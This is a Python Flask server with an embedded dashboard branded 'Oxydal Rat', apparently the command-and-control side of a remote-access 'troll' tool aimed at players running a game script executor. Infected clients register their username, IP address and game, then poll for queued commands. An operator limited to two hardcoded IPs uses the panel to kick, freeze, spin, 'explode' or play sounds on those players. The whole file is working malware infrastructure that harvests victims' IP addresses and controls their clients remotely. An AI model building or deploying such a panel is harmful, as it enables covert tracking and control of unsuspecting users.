from flask import Flask, request, jsonify, render_template_string, abort
from flask_socketio import SocketIO
import time
import eventlet

eventlet.monkey_patch()

app = Flask(__name__)
app.config["SECRET_KEY"] = "oxydal_ultra_secret_99"
socketio = SocketIO(app, cors_allowed_origins="*", async_mode="eventlet")

ALLOWED_IPS = {"37.66.149.36", "91.170.86.224"}

connected_players = {}
pending_kicks = {}
pending_commands = {}

def check_ip():
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    if ip and "," in ip:
        ip = ip.split(",")[0].strip()
    if ip not in ALLOWED_IPS:
        abort(403)

@app.errorhandler(403)
def access_denied(e):
    detected = request.headers.get("X-Forwarded-For", request.remote_addr)
    if detected and "," in detected:
        detected = detected.split(",")[0].strip()
    return f"<h1>Accès refusé</h1><p>IP: {detected}</p>", 403

@app.before_request
def protect_routes():
    if request.path in ["/", "/kick", "/troll"]:
        check_ip()

# --- DESIGN AMÉLIORÉ (STYLE IMAGE - VERT & TEAL) ---

HTML = """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Oxydal Rat | Emerald Control</title>
    <script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700&family=Inter:wght@300;400;600&display=swap" rel="stylesheet">
    <style>
        :root {
            --primary: #00ffcc;
            --primary-glow: rgba(0, 255, 204, 0.4);
            --bg: #030a0e;
            --card-bg: rgba(6, 18, 24, 0.8);
            --border: rgba(0, 255, 204, 0.2);
            --danger: #ff3366;
            --warning: #ffcc00;
        }

        * { box-sizing: border-box; margin: 0; padding: 0; }
        
        body {
            font-family: 'Inter', sans-serif;
            background: radial-gradient(circle at top right, #0a1f26 0%, #030a0e 100%);
            color: #fff;
            min-height: 100vh;
            overflow-x: hidden;
        }

        /* Effet de particules en arrière-plan (discret) */
        body::after {
            content: ""; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background-image: radial-gradient(var(--primary-glow) 1px, transparent 1px);
            background-size: 50px 50px; opacity: 0.1; z-index: -1;
        }

        .container { max-width: 1300px; margin: auto; padding: 40px; }

        header {
            text-align: center;
            margin-bottom: 50px;
        }

        h1 {
            font-family: 'Orbitron', sans-serif;
            font-size: 3.5rem;
            color: var(--primary);
            text-shadow: 0 0 20px var(--primary-glow);
            letter-spacing: 4px;
            margin-bottom: 10px;
        }

        .stats-bar {
            background: var(--card-bg);
            border: 1px solid var(--border);
            border-radius: 50px;
            padding: 10px 30px;
            display: inline-flex;
            align-items: center;
            gap: 20px;
            font-family: 'Orbitron';
            font-size: 1.1rem;
            box-shadow: 0 0 20px rgba(0,0,0,0.5);
        }

        .pulse-line {
            width: 100px; height: 2px;
            background: linear-gradient(90deg, transparent, var(--primary), transparent);
            position: relative; overflow: hidden;
        }
        .pulse-line::after {
            content: ""; position: absolute; left: -100%; width: 100%; height: 100%;
            background: #fff; animation: pulse-move 2s infinite;
        }
        @keyframes pulse-move { 100% { left: 100%; } }

        .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(350px, 1fr)); gap: 25px; }

        /* Card Style */
        .card {
            background: var(--card-bg);
            border: 1px solid var(--border);
            border-radius: 15px;
            padding: 20px;
            backdrop-filter: blur(10px);
            transition: all 0.3s ease;
            position: relative;
        }

        .card:hover {
            border-color: var(--primary);
            transform: scale(1.02);
            box-shadow: 0 10px 30px rgba(0, 255, 204, 0.15);
        }

        .card-header {
            display: flex; justify-content: space-between; align-items: center;
            border-bottom: 1px solid var(--border);
            padding-bottom: 15px; margin-bottom: 15px;
        }

        .player-name { font-family: 'Orbitron'; font-size: 1.3rem; color: #fff; }
        
        .status-dot {
            width: 10px; height: 10px; border-radius: 50%;
            background: #555; position: relative;
        }
        .status-dot.online {
            background: var(--primary);
            box-shadow: 0 0 10px var(--primary);
        }

        .player-info {
            font-size: 0.85rem; color: rgba(255,255,255,0.6);
            margin-bottom: 20px; line-height: 1.5;
        }
        .player-info b { color: var(--primary); }

        .cat-title {
            font-size: 0.75rem; text-transform: uppercase; letter-spacing: 2px;
            color: var(--primary); margin-bottom: 10px; opacity: 0.7;
        }

        /* Buttons Style */
        .btn-group { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; margin-bottom: 15px; }

        button {
            padding: 10px; border-radius: 6px; border: 1px solid var(--border);
            background: rgba(0, 255, 204, 0.05); color: #fff;
            font-family: 'Orbitron'; font-size: 0.7rem; cursor: pointer;
            transition: all 0.2s ease; text-transform: uppercase;
        }

        button:hover {
            background: var(--primary); color: #000;
            box-shadow: 0 0 15px var(--primary-glow);
        }

        button.danger {
            border-color: var(--danger); background: rgba(255, 51, 102, 0.1);
        }
        button.danger:hover { background: var(--danger); color: #fff; box-shadow: 0 0 15px rgba(255, 51, 102, 0.4); }

        button.warning {
            border-color: var(--warning); background: rgba(255, 204, 0, 0.1);
        }
        button.warning:hover { background: var(--warning); color: #000; }

        .btn-undo { opacity: 0.5; font-size: 0.6rem; }
        .btn-undo:hover { opacity: 1; }

        /* Modals */
        .modal {
            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.85); backdrop-filter: blur(5px);
            align-items: center; justify-content: center; z-index: 1000;
        }
        .modal.active { display: flex; }
        .modal-content {
            background: var(--bg); border: 1px solid var(--primary);
            padding: 30px; border-radius: 15px; width: 350px; text-align: center;
        }
        .modal-content input {
            width: 100%; padding: 12px; margin: 20px 0;
            background: #000; border: 1px solid var(--border);
            color: var(--primary); border-radius: 5px; outline: none;
        }

        /* Toasts */
        .toast-container { position: fixed; bottom: 20px; right: 20px; z-index: 2000; }
        .toast {
            background: var(--card-bg); border: 1px solid var(--primary);
            padding: 15px 25px; border-radius: 10px; margin-top: 10px;
            animation: slideIn 0.3s ease-out;
        }
        @keyframes slideIn { from { transform: translateX(100%); } to { transform: translateX(0); } }
    </style>
</head>
<body>

<div class="container">
    <header>
        <h1>OXYDAL <span style="font-weight:300">RAT</span></h1>
        <div class="stats-bar">
            <span>ONLINE: <span id="online-count">0</span></span>
            <div class="pulse-line"></div>
            <span style="opacity:0.5" id="total-count">TOTAL: 0</span>
        </div>
    </header>

    <div class="grid" id="players"></div>
</div>

<div class="modal" id="kickModal">
    <div class="modal-content">
        <h2 style="font-family:Orbitron; color:var(--danger)">KICK PLAYER</h2>
        <input type="text" id="kickReason" placeholder="Reason...">
        <div style="display:flex; gap:10px;">
            <button onclick="closeModal()" style="flex:1">Cancel</button>
            <button onclick="performKick()" class="danger" style="flex:1">Execute</button>
        </div>
    </div>
</div>

<div class="modal" id="soundModal">
    <div class="modal-content">
        <h2 style="font-family:Orbitron; color:var(--primary)">PLAY SOUND</h2>
        <input type="text" id="soundId" placeholder="Asset ID...">
        <div style="display:flex; gap:10px;">
            <button onclick="closeSoundModal()" style="flex:1">Cancel</button>
            <button onclick="performSound()" class="warning" style="flex:1">Inject</button>
        </div>
    </div>
</div>

<div class="toast-container" id="toasts"></div>

<script>
    const socket = io();
    let selectedId = null;

    function toast(msg) {
        const t = document.createElement("div");
        t.className = "toast";
        t.innerHTML = `<span style="color:var(--primary)">[SYS]</span> ${msg}`;
        document.getElementById("toasts").appendChild(t);
        setTimeout(() => t.remove(), 4000);
    }

    function openKick(id) { selectedId = id; document.getElementById("kickModal").classList.add("active"); }
    function closeModal() { document.getElementById("kickModal").classList.remove("active"); }
    function openSound(id) { selectedId = id; document.getElementById("soundModal").classList.add("active"); }
    function closeSoundModal() { document.getElementById("soundModal").classList.remove("active"); }

    function performKick() {
        const reason = document.getElementById("kickReason").value || "Kicked by Admin";
        fetch("/kick", {method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify({userid: selectedId, reason: reason})});
        closeModal();
    }

    function performSound() {
        const sid = document.getElementById("soundId").value;
        if(sid) sendTroll(selectedId, "playsound", sid);
        closeSoundModal();
    }

    function sendTroll(id, cmd, asset = null) {
        fetch("/troll", {method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify({userid: id, cmd: cmd, assetId: asset})});
        toast(`Command ${cmd.toUpperCase()} sent`);
    }

    socket.on("update", (data) => {
        document.getElementById("online-count").textContent = data.online;
        document.getElementById("total-count").textContent = `TOTAL: ${data.total}`;
        const grid = document.getElementById("players");
        grid.innerHTML = "";

        Object.entries(data.players).forEach(([id, p]) => {
            const card = document.createElement("div");
            card.className = "card";
            card.innerHTML = `
                <div class="card-header">
                    <span class="player-name">${p.username}</span>
                    <div class="status-dot ${p.online ? "online" : ""}"></div>
                </div>
                <div class="player-info">
                    ID: <b>${id}</b> | EXE: <b>${p.executor}</b><br>
                    IP: <b>${p.ip}</b><br>
                    PLACE: <i>${p.game}</i>
                </div>
                
                <div class="cat-title">Troll Actions</div>
                <div class="btn-group">
                    <button class="danger" onclick="openKick('${id}')">Kick</button>
                    <button class="warning" onclick="sendTroll('${id}','freeze')">Freeze</button>
                    <button onclick="sendTroll('${id}','spin')">Spin</button>
                    <button onclick="openSound('${id}')">Sound</button>
                    <button onclick="sendTroll('${id}','explode')">Explode</button>
                    <button onclick="sendTroll('${id}','jump')">Jump</button>
                </div>

                <div class="cat-title">Utility</div>
                <div class="btn-group">
                    <button class="btn-undo" onclick="sendTroll('${id}','unfreeze')">Unfreeze</button>
                    <button class="btn-undo" onclick="sendTroll('${id}','unspin')">Unspin</button>
                </div>
            `;
            grid.appendChild(card);
        });
    });

    socket.on("kick_notice", d => toast(`Action performed on ${d.username}`));
</script>
</body>
</html>"""

@app.route("/")
def index():
    return render_template_string(HTML)

@app.route("/api", methods=["GET", "POST"])
def api():
    now = time.time()
    if request.method == "POST":
        try:
            d = request.get_json(silent=True) or {}
            uid = str(d["userid"])
            if d.get("action") == "register":
                connected_players[uid] = {
                    "username": d.get("username", "Unknown"),
                    "executor": d.get("executor", "Unknown"),
                    "ip": d.get("ip", "Unknown"),
                    "last": now,
                    "online": True,
                    "game": d.get("game", "Unknown"),
                    "gameId": d.get("gameId", 0),
                    "jobId": d.get("jobId", "Unknown")
                }
            elif d.get("action") == "heartbeat" and uid in connected_players:
                connected_players[uid]["last"] = now
        except: pass
        return jsonify({"ok": True})

    if request.method == "GET":
        uid = str(request.args.get("userid", ""))
        if not uid: return jsonify({})
        if uid in pending_kicks:
            reason = pending_kicks.pop(uid, "Kicked")
            return jsonify({"command": "kick", "reason": reason})
        if uid in pending_commands:
            cmd = pending_commands.pop(uid)
            assetId = cmd.get("assetId") if isinstance(cmd, dict) else None
            return jsonify({"command": cmd.get("cmd") if isinstance(cmd, dict) else cmd, "assetId": assetId})
        return jsonify({})

@app.route("/kick", methods=["POST"])
def kick():
    check_ip()
    data = request.get_json() or {}
    uid, reason = str(data.get("userid", "")), data.get("reason", "No reason")
    pending_kicks[uid] = reason
    name = connected_players.get(uid, {}).get("username", "Unknown")
    socketio.emit("kick_notice", {"username": name, "reason": reason})
    return jsonify({"sent": True})

@app.route("/troll", methods=["POST"])
def troll():
    check_ip()
    data = request.get_json() or {}
    uid, cmd, assetId = str(data.get("userid", "")), data.get("cmd", ""), data.get("assetId", None)
    if uid and cmd:
        pending_commands[uid] = {"cmd": cmd, "assetId": assetId} if assetId else cmd
        name = connected_players.get(uid, {}).get("username", "Unknown")
        socketio.emit("kick_notice", {"username": name, "reason": cmd.upper()})
    return jsonify({"sent": True})

def broadcast_loop():
    while True:
        now = time.time()
        online = 0
        to_remove = []
        for uid, p in connected_players.items():
            if now - p["last"] > 30: to_remove.append(uid)
            else:
                p["online"] = now - p["last"] < 15
                if p["online"]: online += 1
        for uid in to_remove: connected_players.pop(uid, None)
        socketio.emit("update", {"players": connected_players, "online": online, "total": len(connected_players)})
        socketio.sleep(2)

if __name__ == "__main__":
    socketio.start_background_task(broadcast_loop)
    socketio.run(app, host="0.0.0.0", port=5000)
